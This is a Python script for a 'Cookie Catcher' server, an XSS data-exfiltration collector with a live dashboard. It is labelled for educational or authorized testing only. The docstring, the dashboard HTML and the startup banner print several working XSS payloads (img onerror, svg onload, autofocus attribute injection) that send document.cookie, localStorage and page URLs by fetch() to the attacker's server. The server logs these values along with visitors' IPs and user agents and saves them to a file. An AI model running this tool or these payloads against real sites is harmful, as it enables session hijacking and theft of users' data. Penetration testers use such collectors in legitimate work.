#!/usr/bin/env python3
"""
Cookie Catcher Server - For XSS Security Testing Only
Educational purpose - Test on your own websites only!

Usage:
    python cookie_catcher.py [--port 8888]

Then use XSS payload:
    <img src=x onerror="fetch('http://YOUR_IP:8888/steal?c='+document.cookie)">
"""

import argparse
import json
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import socket

# Store captured data
captured_data = []

class CookieCatcherHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Custom logging
        pass

    def _send_cors_headers(self):
        """Send CORS headers to allow cross-origin requests"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')

    def do_OPTIONS(self):
        """Handle preflight CORS requests"""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # Dashboard
        if parsed.path == '/' or parsed.path == '/dashboard':
            self._serve_dashboard()
            return

        # Steal endpoint
        if parsed.path == '/steal':
            self._handle_steal(params)
            return

        # API to get captured data
        if parsed.path == '/api/captured':
            self._serve_captured_data()
            return

        # Clear data
        if parsed.path == '/clear':
            captured_data.clear()
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return

        # 1x1 transparent pixel (for img tag payloads)
        if parsed.path == '/pixel.gif':
            self._serve_pixel()
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        """Handle POST requests for data exfiltration"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        parsed = urlparse(self.path)
        if parsed.path == '/steal':
            params = parse_qs(post_data)
            self._handle_steal(params)
            return

        self.send_response(404)
        self.end_headers()

    def _handle_steal(self, params):
        """Capture stolen data"""
        timestamp = datetime.now().isoformat()

        data = {
            'timestamp': timestamp,
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', 'Unknown'),
            'referer': self.headers.get('Referer', 'Unknown'),
            'cookies': params.get('c', [''])[0],
            'url': params.get('url', [''])[0],
            'localStorage': params.get('ls', [''])[0],
            'sessionStorage': params.get('ss', [''])[0],
            'extra': params.get('extra', [''])[0],
        }

        captured_data.append(data)

        # Console output
        print(f"\n{'='*60}")
        print(f"[{timestamp}] NEW CAPTURE!")
        print(f"{'='*60}")
        print(f"IP: {data['ip']}")
        print(f"Referer: {data['referer']}")
        print(f"Cookies: {data['cookies'][:100]}..." if len(data['cookies']) > 100 else f"Cookies: {data['cookies']}")
        if data['url']:
            print(f"URL: {data['url']}")
        if data['localStorage']:
            print(f"LocalStorage: {data['localStorage'][:100]}...")
        print(f"{'='*60}\n")

        # Respond with 1x1 pixel or JSON
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def _serve_pixel(self):
        """Serve 1x1 transparent GIF"""
        # 1x1 transparent GIF
        pixel = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        self.wfile.write(pixel)

    def _serve_dashboard(self):
        """Serve dashboard HTML"""
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Cookie Catcher Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        h1 { color: #e94560; margin-bottom: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .payloads { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .payloads h2 { color: #0f3460; margin-bottom: 10px; color: #e94560; }
        .payload { background: #0f3460; padding: 10px; margin: 10px 0; border-radius: 4px; overflow-x: auto; }
        .payload code { color: #00ff00; white-space: pre-wrap; word-break: break-all; }
        .captures { background: #16213e; padding: 20px; border-radius: 8px; }
        .captures h2 { color: #e94560; margin-bottom: 10px; }
        .capture { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 4px; }
        .capture-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
        .capture-time { color: #e94560; }
        .capture-ip { color: #00ff00; }
        .capture-data { color: #ffd700; word-break: break-all; }
        .btn { background: #e94560; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; }
        .btn:hover { background: #ff6b6b; }
        .empty { color: #666; font-style: italic; }
        .info { background: #0f3460; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
        .info code { color: #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🍪 Cookie Catcher Dashboard</h1>

        <div class="info">
            <p>Server running at: <code>http://SERVER_IP:SERVER_PORT</code></p>
        </div>

        <div class="payloads">
            <h2>XSS Payloads</h2>

            <p style="margin-bottom:10px;">Basic cookie steal:</p>
            <div class="payload">
                <code>&lt;img src=x onerror="fetch('http://SERVER_IP:SERVER_PORT/steal?c='+document.cookie)"&gt;</code>
            </div>

            <p style="margin-bottom:10px;">Full data exfiltration:</p>
            <div class="payload">
                <code>&lt;img src=x onerror="fetch('http://SERVER_IP:SERVER_PORT/steal?c='+document.cookie+'&amp;url='+location.href+'&amp;ls='+JSON.stringify(localStorage))"&gt;</code>
            </div>

            <p style="margin-bottom:10px;">Event handler (for input fields):</p>
            <div class="payload">
                <code>"onfocus="fetch('http://SERVER_IP:SERVER_PORT/steal?c='+document.cookie)" autofocus="</code>
            </div>

            <p style="margin-bottom:10px;">SVG payload:</p>
            <div class="payload">
                <code>&lt;svg onload="fetch('http://SERVER_IP:SERVER_PORT/steal?c='+document.cookie)"&gt;</code>
            </div>
        </div>

        <div class="captures">
            <h2>Captured Data <button class="btn" onclick="location.href='/clear'" style="float:right;font-size:12px;">Clear All</button></h2>
            <div id="captures-list">
                <p class="empty">No captures yet. Waiting for XSS payload to execute...</p>
            </div>
        </div>
    </div>

    <script>
        function loadCaptures() {
            fetch('/api/captured')
                .then(r => r.json())
                .then(data => {
                    const list = document.getElementById('captures-list');
                    if (data.length === 0) {
                        list.innerHTML = '<p class="empty">No captures yet. Waiting for XSS payload to execute...</p>';
                        return;
                    }
                    list.innerHTML = data.reverse().map(c => `
                        <div class="capture">
                            <div class="capture-header">
                                <span class="capture-time">${c.timestamp}</span>
                                <span class="capture-ip">IP: ${c.ip}</span>
                            </div>
                            <p><strong>Referer:</strong> ${c.referer}</p>
                            <p><strong>User-Agent:</strong> ${c.user_agent}</p>
                            <p class="capture-data"><strong>Cookies:</strong> ${c.cookies || '(empty)'}</p>
                            ${c.url ? `<p><strong>URL:</strong> ${c.url}</p>` : ''}
                            ${c.localStorage ? `<p><strong>LocalStorage:</strong> ${c.localStorage}</p>` : ''}
                        </div>
                    `).join('');
                });
        }

        // Load initially and refresh every 3 seconds
        loadCaptures();
        setInterval(loadCaptures, 3000);
    </script>
</body>
</html>'''

        # Replace placeholders with actual server info
        ip = get_local_ip()
        html = html.replace('SERVER_IP', ip).replace('SERVER_PORT', str(self.server.server_port))

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_captured_data(self):
        """Serve captured data as JSON"""
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(captured_data).encode())


def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def main():
    parser = argparse.ArgumentParser(description='Cookie Catcher Server for XSS Testing')
    parser.add_argument('-p', '--port', type=int, default=8888, help='Port to listen on (default: 8888)')
    args = parser.parse_args()

    ip = get_local_ip()

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║            🍪 COOKIE CATCHER - XSS Testing Tool 🍪            ║
╠══════════════════════════════════════════════════════════════╣
║  ⚠️  FOR EDUCATIONAL/AUTHORIZED SECURITY TESTING ONLY! ⚠️     ║
╠══════════════════════════════════════════════════════════════╣
║  Server: http://{ip}:{args.port:<5}                            ║
║  Dashboard: http://{ip}:{args.port}/                           ║
╠══════════════════════════════════════════════════════════════╣
║  XSS Payloads:                                               ║
║                                                              ║
║  1. Basic cookie steal:                                      ║
║  <img src=x onerror="fetch('http://{ip}:{args.port}/steal?c='+document.cookie)">
║                                                              ║
║  2. Input field event:                                       ║
║  "onfocus="fetch('http://{ip}:{args.port}/steal?c='+document.cookie)" autofocus="
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)

    server = HTTPServer(('0.0.0.0', args.port), CookieCatcherHandler)
    print(f"[*] Listening on port {args.port}...")
    print(f"[*] Press Ctrl+C to stop\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] Server stopped. Captured {len(captured_data)} entries.")
        if captured_data:
            # Save to file
            filename = f"captured_cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(captured_data, f, indent=2)
            print(f"[*] Data saved to: {filename}")


if __name__ == '__main__':
    main()
